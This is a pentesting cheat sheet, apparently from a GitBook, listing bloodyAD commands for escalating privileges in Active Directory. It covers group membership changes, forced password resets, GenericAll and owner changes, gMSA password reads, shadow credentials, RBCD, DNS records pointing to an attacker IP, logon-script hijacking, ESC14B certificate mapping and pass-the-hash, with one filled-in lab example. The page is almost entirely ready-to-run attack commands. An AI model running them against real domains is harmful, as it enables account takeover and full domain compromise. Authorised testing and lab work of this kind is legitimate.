---
description: bloodyAD is an Active Directory privilege escalation swiss army knife
---

# BloodyAD

**Retrieve User Information**

{% code overflow="wrap" %}
```bash
1bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```
{% endcode %}

**Add User To Group**

{% code overflow="wrap" %}
```bash
1bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```
{% endcode %}

**Change Password**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
```
{% endcode %}

**Give User GenericAll Rights**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username
```
{% endcode %}

Using the SID:

{% code overflow="wrap" %}
```bash
bloodyAD --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' add genericAll 'S-1-5-21-2410575906-3092493790-2123333151-1104' 'S-1-5-21-750635624-2058721901-1932338391-2617'[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on S-1-5-21-2410575906-3092493790-2123333151-1104
```
{% endcode %}

**WriteOwner**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username
```
{% endcode %}

**ReadGMSAPassword**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
```
{% endcode %}

**Enable a Disabled Account**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
```
{% endcode %}

**Add The TRUSTED\_TO\_AUTH\_FOR\_DELEGATION Flag**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION
```
{% endcode %}

**Modify UPN**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $old_upn userPrincipalName -v $new_upn
```
{% endcode %}

Check if it has been modified

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_user --attr userPrincipalName
```
{% endcode %}

**MachineAccountQuota**

Enumerate MachineAccountQuota

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota
```
{% endcode %}

Set MachineAccountQuota value to 10

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10
```
{% endcode %}

**Modify the email**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v [email protected]
```
{% endcode %}

**Modify the altSecurityIdentities attribute (ESC14B)**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>[email protected]'
```
{% endcode %}

**Find Writable Attributes**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```
{% endcode %}

**Shadow Credentials**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
```
{% endcode %}

**WriteSPN**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
```
{% endcode %}

**Find Deleted Objects**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
```
{% endcode %}

**Extended Search Operations**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get search -h
```
{% endcode %}

**Restore a deleted object**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```
{% endcode %}

**Create a new computer account**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
```
{% endcode %}

**Add Resource Based Constrained Delegation**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```
{% endcode %}

**Register a DNS Record**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password add dnsRecord $record_name $attacker_ip
```
{% endcode %}

**Overwrite the logon script path**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $DN scriptPath -v $file
```
{% endcode %}

**Collect Bloodhound data**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get bloodhound
```
{% endcode %}

**Change Group Type to Domain Local**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $group groupType -v -2147483644
```
{% endcode %}

**Get the msDS-ManagedPassword blob**

{% code overflow="wrap" %}
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get search --filter '(sAMAccountName=account_name$)' --attr 'msDS-ManagedPassword,msDS-ManagedPasswordId,sAMAccountName' --raw
```
{% endcode %}

**Notes**

* Pass `-k` to use kerberos authentication.
* You can pass a user hash instead of a password using `-p :hash`.
* Specify format for `--password` or `-k <keyfile>` using `-f`, e.g. `-f rc4`.
